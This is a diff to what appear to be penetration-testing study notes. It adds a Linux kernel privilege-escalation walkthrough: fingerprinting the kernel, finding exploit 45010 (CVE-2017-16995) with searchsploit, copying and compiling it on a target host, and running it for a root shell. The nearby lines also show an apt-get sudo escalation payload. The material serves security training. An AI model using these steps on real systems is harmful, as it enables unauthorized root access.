@@ -1439,7 +1439,34 @@ Reference
       `su - root` `aa-status`
     - ['Apt-get'](https://gtfobins.github.io/gtfobins/apt-get/#sudo) privilege escalation payload
       `sudo apt-get changelog apt`
-  - exploit kernel vulnerababilities 
+  - exploit kernel vulnerababilities
+    - depend OS Debian, RHEL, Gentoo  
+    - gather info of target  
+      `cat /etc/issue` > Ubuntu 16.04.4 LTS \n \l
+    - gather kernel and architecture  (linux)  
+      `uname -r` > 4.4.0-116-generic    
+      `arch` > x86_64  
+    - Use [searchsploit](https://www.exploit-db.com/searchsploit) to find kernel exploits matching the target version  
+      `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"`
+      output: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010. (newer and matches our kernel version)  
+    - Use gcc to compile (must match the architecture of target)  
+      ```
+      cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+      head 45010.c -n 20
+
+      #output
+      gcc cve-2017-16995.c -o cve-2017-16995
+
+      mv 45010.c cve-2017-16995.c
+      ```
+    - transfer the source code to the target machine  
+      `scp cve-2017-16995.c joe@192.168.123.216:`  
+    - compiling the exploit on the target  
+      `joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995`  
+    - examing the exploit binary file's architecture > x86-64  
+      `file cve-2017-16995`  
+    - obtain a root shell via kernel exploitation  
+      `./cve-2017-16995` `id`  
 
 ### 19. Port redirection and SSH tunneling
 ### 20. Tunneling through deep packet inspectation
